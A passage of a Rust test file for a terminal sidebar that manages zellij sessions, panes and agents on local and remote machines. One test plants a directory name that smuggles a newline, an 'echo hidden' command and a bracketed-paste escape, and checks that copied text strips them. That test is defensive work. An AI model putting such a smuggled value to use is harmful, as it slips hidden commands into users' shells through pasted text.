        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 9, 5), area), Asked::Nothing);
        let up = sidebar.mouse(mouse(MouseEventKind::Up(left), 9, 5), area);
        assert_eq!(up, copied(&format!("bipa {}\n       a-p", "─".repeat(22))));
        assert_eq!(drawn_rows(&mut sidebar).0, listed);

        // This machine's header.
        assert_eq!(swept(&mut sidebar, area, (5, 3), (7, 3)), copied("mac"));
        assert_eq!(drawn_rows(&mut sidebar).0, listed);

        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 8), area);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 11, 8), area), Asked::Nothing);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 11, 9), area), Asked::Take);
    }

    /// What is swept shows reversed from the frame after it moves, through the
    /// frames and the daemon's answers after it lets go, a row's own text
    /// changing among them, however the pointer moves then, until the next click.
    #[test]
    fn a_sweep_shows_reversed_until_the_next_click() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 26);
        assert_eq!(reversed(&framed(&mut sidebar, area)), []);
        dragged(&mut sidebar, area, (7, 5), (9, 5));
        let cells = [(7, 5), (8, 5), (9, 5)];
        assert_eq!(reversed(&framed(&mut sidebar, area)), cells);

        let up = sidebar.mouse(mouse(MouseEventKind::Up(MouseButton::Left), 9, 5), area);
        assert_eq!(up, copied("a-p"));
        assert_eq!(reversed(&framed(&mut sidebar, area)), cells);
        sidebar.mouse(mouse(MouseEventKind::Moved, 20, 12), area);
        sidebar.heard(searched().host.unwrap());
        assert_eq!(reversed(&framed(&mut sidebar, area)), cells);
        sidebar.heard(first_pane_is(1, "a-p-i-y"));
        assert_eq!(reversed(&framed(&mut sidebar, area)), cells);

        sidebar.unsweep();
        assert_eq!(reversed(&framed(&mut sidebar, area)), []);
    }

    /// What `searched` lists, with its first pane another: its row takes as
    /// many lines, on the same line, whichever pane it is.
    fn first_pane_is(id: u32, command: &str) -> Host {
        let mut listed = searched().host.unwrap();
        let first = &mut listed.sessions[0].panes.as_mut().unwrap().panes[0];
        first.id = id;
        first.command = Some(command.to_owned());
        listed
    }

    /// Once what shows under a sweep may be other than what it copied, it goes:
    /// the wheel, a pane that came, another pane or note on as many lines, a row
    /// taking a line more, the keys bringing the legend, another width, the
    /// sidebar collapsed.
    #[test]
    fn a_sweep_goes_once_the_text_moves_from_under_it() {
        let area = Rect::new(0, 0, 32, 26);
        let more_rows = || {
            let panes = vec![pane(1, 0, "/w/a", "a-p-i-x"), pane(2, 1, "/w/b", "b")];
            host(vec![session("bipa", 10, panes)], Vec::new())
        };
        let branch_too = || {
            let mut listed = searched().host.unwrap();
            let (trees, pulls) = (&mut listed.work_trees, &mut listed.pull_requests);
            checked_out(trees, pulls, "/w/a", "main", None);
            listed
        };
        let moves: [&dyn Fn(&mut Sidebar); 8] = [
            &|sidebar| {
                sidebar.mouse(mouse(MouseEventKind::ScrollDown, 7, 5), area);
            },
            &|sidebar| {
                sidebar.heard(more_rows());
            },
            &|sidebar| {
                sidebar.heard(first_pane_is(9, "other"));
            },
            &|sidebar| {
                sidebar.notify("other word".to_owned());
            },
            &|sidebar| {
                sidebar.heard(branch_too());
            },
            &|sidebar| {
                sidebar.focus(Keys::Sidebar);
            },
            &|sidebar| {
                framed(sidebar, Rect::new(0, 0, 28, 26));
            },
            &|sidebar| {
                sidebar.draw_collapsed(&mut Buffer::empty(area), area, moment(160_000));
            },
        ];
        for (case, moved) in moves.iter().enumerate() {
            let mut sidebar = searched();
            sidebar.notify("first word".to_owned());
            framed(&mut sidebar, area);
            assert_eq!(swept(&mut sidebar, area, (7, 5), (9, 5)), copied("a-p"));
            moved(&mut sidebar);
            assert_eq!(reversed(&framed(&mut sidebar, area)), [], "case {case}");
        }
    }

    /// `Esc`, or the pointer moving with no button down after a release luneta
    /// did not hear, lets go of what is swept: it shows no more, the notes stay,
    /// and its release, if it comes, copies nothing.
    #[test]
    fn a_sweep_let_go_otherwise_copies_nothing() {
        let area = Rect::new(0, 0, 32, 26);
        let esc = KeyEvent::from(KeyCode::Esc);
        let lets_go: [&dyn Fn(&mut Sidebar); 2] = [
            &|sidebar| {
                sidebar.key(&esc, moment(160_000));
            },
            &|sidebar| {
                sidebar.mouse(mouse(MouseEventKind::Moved, 9, 5), area);
            },
        ];
        for (case, let_go) in lets_go.iter().enumerate() {
            let mut sidebar = searched();
            sidebar.notify("a note".to_owned());
            framed(&mut sidebar, area);
            dragged(&mut sidebar, area, (7, 5), (9, 5));
            let_go(&mut sidebar);
            assert!(!sidebar.pressed(), "case {case}");
            assert_eq!(sidebar.notice.as_deref(), Some("a note"), "case {case}");
            assert_eq!(reversed(&framed(&mut sidebar, area)), [], "case {case}");
            let up = sidebar.mouse(mouse(MouseEventKind::Up(MouseButton::Left), 9, 5), area);
            assert_eq!(up, Asked::Nothing, "case {case}");
        }
    }

    /// A sweep over the notes at the bottom has each as it was said, though it
    /// wrapped, and each to a line of its own, whatever else takes lines there.
    #[test]
    fn a_sweep_has_each_note_as_it_was_said() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 26);
        let (why, notice) = (
            "the daemon stopped answering a while ago",
            "something went wrong with what you asked for just now",
        );
        sidebar.lost(why.to_owned());
        sidebar.notify(notice.to_owned());
        framed(&mut sidebar, area);
        // Two lines of two notes, at the bottom.
        let said = format!(" lunetad: {why}\n {notice}");
        assert_eq!(swept(&mut sidebar, area, (0, 22), (30, 25)), copied(&said));
    }

    /// Where a sweep has the `…` of a machine's, a session's or a pane's text
    /// cut short, it copies what the cut took, whichever line of the rows has it
    /// on screen now. Short of the `…`, it copies what shows.
    #[test]
    fn a_sweep_has_a_text_cut_short_whole() {
        let long = "a-text-too-long-for-the-sidebar";
        let panes = vec![pane(1, 1, "/w/a", long)];
        let mut local = host(vec![session(long, 10, panes)], Vec::new());
        let (trees, pulls) = (&mut local.work_trees, &mut local.pull_requests);
        checked_out(trees, pulls, "/w/a", long, Some((246, State::Open, Some(LINK))));
        local.remotes = vec![remote("me@a-host-too-long-for-the-sidebar", down(100))];
        let mut sidebar = fresh();
        sidebar.this = long.to_owned();
        sidebar.heard(local);
        let area = Rect::new(0, 0, 24, 14);
        framed(&mut sidebar, area);
        for (line, from, whole) in [
            (3, 5, long.to_owned()),
            (4, 3, long.to_owned()),
            (5, 7, long.to_owned()),
            (6, 7, format!("{long} #246")),
            (7, 5, "me@a-host-too-long-for-the-sidebar · unreachable 1m".to_owned()),
        ] {
            assert_eq!(swept(&mut sidebar, area, (from, line), (22, line)), copied(&whole));
        }
        assert_eq!(swept(&mut sidebar, area, (7, 5), (11, 5)), copied("a-tex"));

        sidebar.mouse(mouse(MouseEventKind::ScrollDown, 7, 5), area);
        framed(&mut sidebar, area);
        // The branch, its row three lines further up now.
        let branch = format!("{long} #246");
        assert_eq!(swept(&mut sidebar, area, (7, 3), (22, 3)), copied(&branch));
    }

    /// A `…` is found where it is drawn, past a sound mark that takes a cell of
    /// its own.
    #[test]
    fn a_sweep_finds_the_cut_past_a_halfwidth_sound_mark() {
        let long = "\u{ff8a}\u{ff9e}-a-text-too-long-for-the-sidebar";
        let mut sidebar = fresh();
        sidebar.heard(host(vec![session("s", 10, vec![pane(1, 1, "/w/a", long)])], Vec::new()));
        let area = Rect::new(0, 0, 24, 14);
        framed(&mut sidebar, area);
        assert_eq!(swept(&mut sidebar, area, (7, 5), (22, 5)), copied(long));
    }

    /// What a cut took shows nowhere, so that a control character in it would go
    /// unseen on the clipboard, as a line break that a paste into a shell runs.
    /// It comes out as a row would draw it, with none.
    #[test]
    fn a_sweep_has_no_control_character_of_what_a_cut_took() {
        let cwd = "/w/a-directory-too-long-for-the-sidebar\necho hidden\x1b[201~\tend";
        let mut sidebar = fresh();
        sidebar.heard(host(vec![session("s", 10, vec![pane(1, 1, cwd, "fish")])], Vec::new()));
        let area = Rect::new(0, 0, 24, 14);
        framed(&mut sidebar, area);
        let whole = "w/a-directory-too-long-for-the-sidebarecho hidden[201~end";
        assert_eq!(swept(&mut sidebar, area, (7, 5), (22, 5)), copied(whole));
    }

    /// A session lifted and held on the last line of the rows scrolls them a
    /// line each `SCROLL`, as far as the last row, and on the first line,
    /// back.
    #[test]
    fn a_session_held_on_the_edge_scrolls_the_rows() {
        let mut sidebar = searched();
        // Four lines of rows, between the rule and the legend.
        let area = Rect::new(0, 0, 32, 20);
        let first = |sidebar: &mut Sidebar| screen(sidebar, true, 32, 20)[HEADER].clone();
        assert_eq!(first(&mut sidebar), format!(" ▾ \u{f108} mac {}", "═".repeat(21)));
        let left = MouseButton::Left;
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 4), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 6), area);
        let start = steady(moment(160_000));
        let tick = |sidebar: &mut Sidebar, millis: u64| {
            let at = moment(160_000 + millis);
            sidebar.ticked(at, start + Duration::from_millis(millis), true);
            first(sidebar)
        };
        assert!(sidebar.scrolling());
        assert_eq!(tick(&mut sidebar, 0), " ▾ notes ─────────────────────");
        assert_eq!(tick(&mut sidebar, 30), " ▾ notes ─────────────────────");
        assert_eq!(tick(&mut sidebar, 60), "     \u{e795} me/Documents");
        for millis in (120..=600).step_by(60) {
            tick(&mut sidebar, millis);
        }
        // The last four rows: bipa's, as it lands last.
        assert_eq!(first(&mut sidebar), " ▾ bipa ──────────────────────");
        assert!(!sidebar.scrolling());
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 3), area);
        assert_eq!(tick(&mut sidebar, 660), "       less logs");
    }

    /// `Ctrl v` is for an agent on another machine: one in the pane luneta's
    /// zellij is on there, as its client is followed. A shell beside it there
    /// keeps its own, and so does an agent on this machine, in a pane by the
    /// same number of a session by the same name.
    #[test]
    fn a_far_agent_is_one_in_the_pane_zellij_is_on_there() {
        let mut sidebar = fresh();
        let mut host = machines();
        let panes = |command| vec![pane(1, 0, "/w/b", command), pane(2, 0, "/w/b", "fish")];
        let agents = || vec![agent("main", 1, Status::Idle, Some("fix"))];
        host.sessions = vec![session("main", 10, panes("claude"))];
        host.agents = agents();
        host.remotes[0] = remote("nixos", up(vec![session("main", 20, panes("claude"))], agents()));
        sidebar.heard(host.clone());
        assert_eq!(sidebar.far_agent(), None);

        let look = sidebar.swapping(&Machine::Remote(nixos()), &session_name("main"));
        assert_eq!(sidebar.far_agent(), None, "the sidebar does not know the pane yet");
        let clients = |pane| vec![Client { id: 1, pane: Some(pane) }];
        let before = || Some(Before::Listed(Vec::new()));
        let looked = Looked { number: look.number, went: None, clients: clients(1), before: before() };
        sidebar.looked(looked);
        sidebar.titled("main | fix".to_owned());
        assert_eq!(sidebar.far_agent(), Some(&nixos()));

        let look = sidebar.swapping(&Machine::Remote(nixos()), &session_name("main"));
        let looked = Looked { number: look.number, went: None, clients: clients(2), before: before() };
        sidebar.looked(looked);
        assert_eq!(sidebar.far_agent(), None, "a shell there keeps its own");

        host.remotes[0] = remote("nixos", up(vec![session("main", 20, panes("fish"))], Vec::new()));
        sidebar.heard(host);
        let look = sidebar.swapping(&Machine::Remote(nixos()), &session_name("main"));
        let looked = Looked { number: look.number, went: None, clients: clients(1), before: before() };
        sidebar.looked(looked);
        assert_eq!(sidebar.far_agent(), None, "its agent ended");
    }

    /// The machine lunetad watches as `destination`, as it says it has it.
    fn remote(destination: &str, reached: Reached) -> api::Remote {
        api::Remote { destination: destination.to_owned(), reached: Some(reached) }
    }

    /// A machine lunetad reached, with `sessions` and `agents`.
    fn up(sessions: Vec<Session>, agents: Vec<Agent>) -> Reached {
        Reached::Host(remote::Host {
            sessions,
            work_trees: Vec::new(),
            agents,
            unread: 0,
            pull_requests: Vec::new(),
            unread_sockets: Some(0),
            unread_files: Vec::new(),
            sayings: Vec::new(),
        })
    }

    /// A machine ssh could not get into, since the second `since`.
    fn down(since: i64) -> Reached {
        Reached::Unreached(remote::Unreached {
            since: Some(Timestamp { seconds: since, nanos: 0 }),
            why: "ssh: Could not resolve hostname vps".to_owned(),
            stopped: Some(remote::unreached::Stopped::Ended(remote::unreached::Ended {
                code: Some(255),
            })),
        })
    }

    fn nixos() -> Destination {
        "nixos".parse().unwrap()
    }

    /// This machine, `mac`, with a session `main`, and the machines its
    /// lunetad watches: `nixos`, with a session `main` of its own, whose
    /// agent waits for you; `me@vps`, which ssh does not get into; and `pi`,
    /// which the first ssh to runs still.
    fn machines() -> Host {
        let nixos = up(
            vec![session("main", 20, vec![pane(1, 0, "/w/b", "claude")])],
            vec![agent("main", 1, Status::Waiting, Some("fix"))],
        );
        Host {
            remotes: vec![
                remote("nixos", nixos),
                remote("me@vps", down(100)),
                remote("pi", Reached::Reaching(())),
            ],
            ..host(vec![session("main", 10, vec![pane(1, 0, "/w/a", "fish")])], Vec::new())
        }
    }

    /// A header heads each machine's sessions, this one first, by its name,
    /// and the others as luneta's hosts file names them. One lunetad does
    /// not reach says why in a word, dimmed, and since when; and one it is
    /// reaching, that it is. The rule along the top counts every machine's.
    #[test]
    fn a_header_heads_each_machine_s_sessions_this_one_first() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        assert_eq!(
            screen(&mut sidebar, false, 32, 12),
            [
                "─ luneta ──────────────────────",
                "─ 2 sessions ───────────── ●1 ─",
                "",
                " ▾ \u{f108} mac ═════════════════════",
                " ▾ main ──────────────────────",
                "     \u{e795} w/a",
                " ▾ \u{f108} nixos ════════════════ ●1",
                " ▾ main ─────────────────── ●1",
                "   ● \u{ec82} fix                  1m",
                " ▸ \u{f108} me@vps · unreachable   1m",
                " ▸ \u{f108} pi · reaching…",
                "",
            ]
        );
        // The names of nixos, which lunetad reaches, and of me@vps.
        let buffer = drawn(&mut sidebar, false, 32, 12);
        let dim = |y: u16| buffer[(3, y)].modifier.contains(Modifier::DIM);
        assert_eq!((dim(6), dim(9)), (false, true));
    }

    /// `h` on another machine's pane folds its session, and on that folded
    /// session folds its machine, the highlight going to its header, which
    /// then says what its sessions want of you. A fold of another machine's
    /// session is its own: this one's session of its name stays as it was.
    /// `l` unfolds the machine, and so do `Enter` and a click on its header.
    #[test]
    fn h_on_a_folded_session_folds_its_machine() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        let machine = Machine::Remote(nixos());
        let fix = pane_of("main", 20, 1);
        type_in(&mut sidebar, "Gkk");
        assert_eq!(sidebar.cursor, Some(Spot::Remote(nixos(), fix)));
        type_in(&mut sidebar, "h");
        assert!(sidebar.folds.contains(Fold::Session(&machine, &session_name("main"))));
        assert!(!folded(&sidebar, "main"));
        type_in(&mut sidebar, "h");
        assert_eq!(sidebar.cursor, Some(Spot::Machine(machine.clone())));
        assert!(sidebar.folds.contains(Fold::Machine(&machine)));
        assert_eq!(
            rows_shown(&mut sidebar),
            [
                " ▾ main",
                "     \u{e795} w/a",
                " ▸ \u{f108} nixos ════════════════ ●1",
                " ▸ \u{f108} me@vps · unreachable   1m",
                " ▸ \u{f108} pi · reaching…",
            ]
        );
        type_in(&mut sidebar, "l");
        assert!(!sidebar.folds.contains(Fold::Machine(&machine)));
        type_in(&mut sidebar, "h");
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Nothing);
        assert!(!sidebar.folds.contains(Fold::Machine(&machine)));
        let area = Rect::new(0, 0, 32, 26);
        screen(&mut sidebar, true, area.width, area.height);
        assert_eq!(click(&mut sidebar, 20, 6, area), Asked::Take);
        assert!(sidebar.folds.contains(Fold::Machine(&machine)));
    }

    /// Folded, a machine's header says what its sessions hold, as a session's
    /// row does: the dot, where something finished in one of its panes; or else
    /// the spinner, where an agent of its is at work; and neither otherwise. Its
    /// rule turns the accent where luneta's zellij is in one of its sessions.
    #[test]
    fn a_folded_machine_s_header_says_what_its_sessions_hold() {
        let holding = |status, in_it| {
            let panes = vec![pane(1, 0, "/w/b", "claude")];
            let agents = vec![agent("main", 1, status, Some("fix"))];
            let mut host = machines();
            host.remotes = vec![remote("nixos", up(vec![session("main", 20, panes)], agents))];
            let mut sidebar = fresh();
            sidebar.heard(host);
            if in_it {
                let look = sidebar.swapping(&Machine::Remote(nixos()), &session_name("main"));
                let clients = vec![Client { id: 1, pane: Some(1) }];
                let before = Some(Before::Listed(Vec::new()));
                sidebar.looked(Looked { number: look.number, went: None, clients, before });
                sidebar.titled("main | fix".to_owned());
            }
            sidebar.focus(Keys::Sidebar);
            type_in(&mut sidebar, "Ghh");
            sidebar
        };
        let header = |status| rows_shown(&mut holding(status, false)).pop().expect("a header");
        assert_eq!(header(Status::Idle), format!(" ▸ \u{f108} nixos {} •", "═".repeat(17)));
        assert_eq!(header(Status::Busy), format!(" ▸ \u{f108} nixos {} ⠋", "═".repeat(17)));
        assert_eq!(header(Status::Shell), format!(" ▸ \u{f108} nixos {}", "═".repeat(19)));

        // Just past the name, in the machine's rule.
        let rule = |in_it| {
            let mut sidebar = holding(Status::Shell, in_it);
            let lines = screen(&mut sidebar, false, 32, 12);
            let y = lines.iter().position(|line| line.contains("nixos")).expect("a header");
            drawn(&mut sidebar, false, 32, 12)[(12, u16::try_from(y).unwrap())].fg
        };
        assert_ne!(rule(false), ACCENT);
        assert_eq!(rule(true), ACCENT);
    }

    /// `d m` on a far row asks that machine what it would delete, and `y` tells
    /// it what you agreed to. Where it would delete something else now, the menu
    /// lists that, or a note says nothing went once the menu has been closed.
    /// What stays is said in a note too.
    #[test]
    fn d_m_on_a_far_row_goes_by_that_machine_and_a_note_says_what_stays() {
        let mut host = machines();
        let Reached::Host(there) = host.remotes[0].reached.as_mut().unwrap() else {
            panic!("nixos is reached");
        };
        let name = Said::new("fix".to_owned()).expect("a branch's name");
        let head = Head::Branch { name, upstream: None, changed: None };
        let repository = Said::new("/w".to_owned());
        let tree = WorkTree::Checkout { repository, head, changes: Changes::default(), stashes: 0 };
        there.work_trees.push(tree.to_api("/w/b"));
        let mut sidebar = fresh();
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        let place = Place::Pane(PanePlace { session: listed("main", 20), pane: 1 });
        sidebar.cursor = Some(Spot::Remote(nixos(), place));
        let now = moment(160_000);
        let on = Machine::Remote(nixos());
        sidebar.key(&char('d'), now);
        let number = sidebar.menu.as_ref().expect("the menu").number();
        let dir = Directory::parse("/w/b".to_owned()).unwrap();
        let asks = Asked::Prunes { menu: number, on: on.clone(), dir: dir.clone() };
        assert_eq!(sidebar.key(&char('m'), now), asks);
        let goes = prunes::Goes {
            worktree: "/w/one".to_owned(),
            branch: "one".to_owned(),
            head: "abc".to_owned(),
            number: 1,
            pushed: prunes::Pushed::Nowhere,
            bytes: None,
        };
        let plan = prunes::Plan {
            repository: "/w".to_owned(),
            goes: vec![goes.clone()],
            kept: Vec::new(),
            unasked: Vec::new(),
        };
        assert_eq!(sidebar.prunes(number + 1, Ok(plan.clone())), Asked::Nothing);
        assert_eq!(sidebar.prunes(number, Ok(plan.clone())), Asked::Nothing);
        let deletes = Asked::Prune { menu: number, on, dir, agreed: plan.deletes() };
        assert_eq!(sidebar.key(&char('y'), now), deletes);
        assert!(sidebar.menu.as_ref().expect("the menu").pruning());
        let changed = Ok(prunes::Pruned::Changed(plan.clone()));
        assert_eq!(sidebar.pruned(number, changed.clone()), Asked::Nothing);
        assert!(!sidebar.menu.as_ref().expect("the menu").pruning());
        assert_eq!(sidebar.key(&char('y'), now), deletes);
        sidebar.key(&KeyEvent::from(KeyCode::Esc), now);
        assert_eq!(sidebar.pruned(number, changed), Asked::Nothing);
        let note = "menu: nothing deleted: what would go changed";
        assert_eq!(sidebar.notice.as_deref(), Some(note));
        sidebar.key(&char('d'), now);
        let number = sidebar.menu.as_ref().expect("the menu").number();
        sidebar.key(&char('m'), now);
        sidebar.prunes(number, Ok(plan));
        sidebar.key(&char('y'), now);
        let came = prunes::Came::Stays("it has a pane".to_owned());
        let stays = prunes::Outcome { worktree: goes.worktree, came };
        assert_eq!(sidebar.pruned(number, Ok(prunes::Pruned::Went(vec![stays]))), Asked::Nothing);
        assert!(sidebar.menu.is_none());
        let note = "menu: deleted 0 of 1 worktrees; one stays: it has a pane";
        assert_eq!(sidebar.notice.as_deref(), Some(note));
    }

    /// Another machine's rows go there, as this one's do: `Enter` and a click
    /// on its pane ask luneta to take its zellij there. The menu on its pane
    /// is for that pane, of that machine, which opens what a key opens. `u`
    /// takes the dot from its pane as from this machine's. A link pasted on
    /// its row opens the menu for the link on that pane, of that machine, as
    /// every key of the menu acts there.
    #[test]
    fn another_machine_s_rows_go_there_and_open_there() {
        let mut sidebar = fresh();
        let mut host = machines();
        host.remotes[0] = remote(
            "nixos",
            up(
                vec![session("main", 20, vec![pane(1, 0, "/w/b", "claude")])],
                vec![agent("main", 1, Status::Idle, Some("fix"))],
            ),
        );
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "Gkk");
        let fix = pane_of("main", 20, 1);
        let there = Asked::Go { on: Machine::Remote(nixos()), place: fix };
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&enter, moment(160_000)), there);
        type_in(&mut sidebar, "mn");
        let on = Machine::Remote(nixos());
        let (session, cwd) = (listed("main", 20), Some("/w/b".to_owned()));
        let (branch, repository, ran) = (None, None, Ran::Unhooked);
        let row = PaneRow { session, pane: 1, cwd, branch, repository, pull_request: None, ran };
        let menu = sidebar.menu.as_ref().expect("the menu");
        assert_eq!(menu.target(), &Target::Pane(on.clone(), row.clone()));
        let number = menu.number();
        let (session, cwd) = (session_name("main"), "/w/b".to_owned());
        let open = Open::Pane { session, beside: 1, cwd, command: Vec::new() };
        let asked = Asked::Open { menu: number, on: on.clone(), open };
        assert_eq!(sidebar.key(&char('p'), moment(160_000)), asked);
        sidebar.close_menu();

        let area = Rect::new(0, 0, 32, 26);
        let lines = screen(&mut sidebar, true, area.width, area.height);
        assert_eq!(lines[8], "  •✓ \u{ec82} fix                  1m");
        assert_eq!(click(&mut sidebar, 10, 8, area), there);

        type_in(&mut sidebar, "u");
        let lines = screen(&mut sidebar, true, area.width, area.height);
        assert_eq!(lines[8], "   ✓ \u{ec82} fix                  1m");

        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
        let pasted = sidebar.menu.as_ref().map(Menu::target);
        assert_eq!(pasted, Some(&Target::Pane(on, PaneRow { ran: Ran::Unhooked, ..row })));
    }

    /// A link pasted on another machine's row is found among that machine's
    /// panes, as lunetad says of them, though luneta's zellij is in none of
    /// them, being on this machine. The session made for it is made there,
    /// and the tab it opens is where luneta goes, on that machine, though
    /// this one has a session of that name.
    #[test]
    fn a_link_pasted_on_another_machine_s_row_makes_its_session_there() {
        let mut sidebar = fresh();
        let mut host = machines();
        let work = || session("work", 20, vec![pane(3, 0, "/w/b", "fish")]);
        host.remotes[0] = remote("nixos", up(vec![work()], Vec::new()));
        sidebar.heard(host.clone());
        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Remote(nixos(), Place::Session(listed("work", 20))));
        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
        let number = sidebar.menu.as_ref().map_or(0, Menu::number);
        let on = Machine::Remote(nixos());
        let link = Link::parse("https://github.com/lorenzolfm/luneta/pull/5").unwrap();
        let worked = links::Worked { dir: "/w/b".to_owned(), pull: None, here: false };
        let worked = vec![Worked { session: listed("work", 20), pane: 3, works: worked }];
        let local = links::Worked { dir: "/w/a".to_owned(), pull: None, here: false };
        let local = vec![Worked { session: listed("main", 10), pane: 1, works: local }];
        let unreached = |name: &str| {
            let machine = Machine::Remote(name.parse().unwrap());
            (machine, Err(format!("lunetad does not reach {name} now")))
        };
        let others = vec![(Machine::Local, Ok(local)), unreached("me@vps"), unreached("pi")];
        let asked = Work::Link(link.clone());
        let wanted = Wanted::AsItIs;
        let pull = Asked::Pull { menu: number, on: on.clone(), work: asked, wanted, worked, others };
        assert_eq!(sidebar.key(&char('w'), moment(160_000)), pull);
        let at = At::Clone { cwd: "/w/n".to_owned(), name: session_name("main") };
        let worktree = "/w/n/feat".to_owned();
        let of_link = Readied::Link(link);
        let ready = Ready { at, worktree, branch: None, moved_off: false, work: of_link };
        let asked = sidebar.pulled(number, Ok(Found { on: on.clone(), ready }));
        assert!(matches!(&asked, Asked::Make { on: there, .. } if *there == on), "{asked:?}");
        let made = session("main", 30, vec![pane(1, 0, "/w/n", "fish")]);
        host.remotes[0] = remote("nixos", up(vec![work(), made], Vec::new()));
        sidebar.heard(host);
        let opened = pane_of("main", 30, 3);
        assert_eq!(sidebar.opened(number, Ok(3)), Asked::Go { on, place: opened });
    }

    /// A link pasted on a row of a machine that has none of its repository,
    /// a folded session's as any other, hands luneta the panes of the other
    /// machines too, in the order of the rows. What luneta finds on one of
    /// them opens there, and takes luneta's zellij there.
    #[test]
    fn a_link_found_on_another_machine_than_the_row_s_opens_there() {
        let mut sidebar = fresh();
        let mut host = machines();
        let work = session("work", 20, vec![pane(3, 0, "/w/b", "fish")]);
        host.remotes[0] = remote("nixos", up(vec![work], Vec::new()));
        sidebar.heard(host);
        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Local(pane_of("main", 10, 1)));
        sidebar.key(&char('h'), moment(160_000));
        assert_eq!(sidebar.cursor, Some(Spot::Local(Place::Session(listed("main", 10)))));

        let nixos = Machine::Remote(nixos());
        let vps = Machine::Remote("me@vps".parse().unwrap());
        sidebar.order.keep_machines(&[vps.clone(), nixos.clone(), Machine::Local]);
        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
        let number = sidebar.menu.as_ref().map_or(0, Menu::number);
        let asked = sidebar.key(&char('r'), moment(160_000));
        let Asked::Pull { on, wanted, others, .. } = asked else {
            panic!("no job for the key: {asked:?}");
        };
        assert_eq!(on, Machine::Local);
        assert_eq!(wanted, Wanted::AtHead);
        let works = links::Worked { dir: "/w/b".to_owned(), pull: None, here: false };
        let work = Worked { session: listed("work", 20), pane: 3, works };
        let unreached = |name: &str| Err(format!("lunetad does not reach {name} now"));
        let pi = Machine::Remote("pi".parse().unwrap());
        assert_eq!(others, [
            (vps, unreached("me@vps")),
            (nixos.clone(), Ok(vec![work])),
            (pi, unreached("pi")),
        ]);

        let link = Link::parse("https://github.com/lorenzolfm/luneta/pull/5").unwrap();
        let at = At::Session((listed("work", 20), 3));
        let worktree = "/w/b/feat".to_owned();
        let of_link = Readied::Link(link);
        let ready = Ready { at, worktree, branch: None, moved_off: false, work: of_link };
        let asked = sidebar.pulled(number, Ok(Found { on: nixos.clone(), ready }));
        let there = |asked: &Asked| matches!(asked, Asked::OpenThere { on, .. } if *on == nixos);
        assert!(there(&asked), "{asked:?}");
        let opened = pane_of("work", 20, 9);
        assert_eq!(sidebar.opened(number, Ok(9)), Asked::Go { on: nixos, place: opened });
    }

    /// A key of the menu for a link pasted on the row of a machine lunetad
    /// does not reach finds nothing there: luneta knows none of its panes,
    /// one of which may work in the repository. The menu closes, and says
    /// why.
    #[test]
    fn a_link_pasted_on_a_machine_lunetad_does_not_reach_finds_nothing() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Machine(Machine::Remote("me@vps".parse().unwrap())));
        sidebar.paste("https://github.com/lorenzolfm/luneta/pull/5");
        assert!(sidebar.menu.is_some());
        assert_eq!(sidebar.key(&char('w'), moment(160_000)), Asked::Nothing);
        assert!(sidebar.menu.is_none());
        let why = "menu: lorenzolfm/luneta#5: lunetad does not reach me@vps now";
        assert_eq!(sidebar.notice.as_deref(), Some(why));
    }

    /// `d d` on another machine's pane asks zellij there what closing it
    /// closes, and asks first by that machine's agents: the agent there waits
    /// for you, though this machine's session of that name runs none in its
    /// pane. `y` has zellij there close it, and the highlight goes past its
    /// row once it is gone.
    #[test]
    fn another_machine_s_pane_closes_there_by_its_agents() {
        let mut sidebar = fresh();
        let mut host = machines();
        let panes = vec![pane(1, 0, "/w/b", "claude"), pane(2, 0, "/w/b", "fish")];
        let agents = vec![agent("main", 1, Status::Waiting, Some("fix"))];
        host.remotes[0] = remote("nixos", up(vec![session("main", 20, panes)], agents));
        sidebar.heard(host.clone());
        sidebar.focus(Keys::Sidebar);
        let fix = |pane| Spot::Remote(nixos(), pane_of("main", 20, pane));
        sidebar.cursor = Some(fix(1));
        type_in(&mut sidebar, "d");
        let menu = sidebar.menu.as_ref().map_or(0, Menu::number);
        let on = Machine::Remote(nixos());
        let closes = Asked::Closes { menu, on: on.clone(), session: session_name("main"), pane: 1 };
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), closes);
        assert_eq!(sidebar.closes(menu, Ok(Closes::Pane)), Asked::Nothing);
        let lines = screen(&mut sidebar, true, 120, 16);
        let lines: Vec<&str> = lines.iter().map(|line| line.trim()).collect();
        assert!(lines.contains(&"Close the pane? 1 agent, 1 waiting"), "{lines:#?}");
        assert_eq!(sidebar.key(&char('y'), moment(160_000)), closes);
        let act = Act::Pane {
            session: session_name("main"),
            started: listed("main", 20).started(),
            pane: 1,
        };
        assert_eq!(sidebar.closes(menu, Ok(Closes::Pane)), Asked::Delete { on, act });
        let left = vec![session("main", 20, vec![pane(2, 0, "/w/b", "fish")])];
        host.remotes[0] = remote("nixos", up(left, Vec::new()));
        sidebar.heard(host);
        assert_eq!(sidebar.cursor, Some(fix(2)));
    }

    /// `d s` on the session of another machine's that luneta's zellij is in
    /// takes it first to the newest of that machine's other sessions, never
    /// to this machine's, and has the session killed there once it has left.
    /// That machine's only session is killed with luneta's zellij in it,
    /// which goes on as it does once its session there ends.
    #[test]
    fn another_machine_s_session_luneta_is_in_goes_once_it_left_for_one_there() {
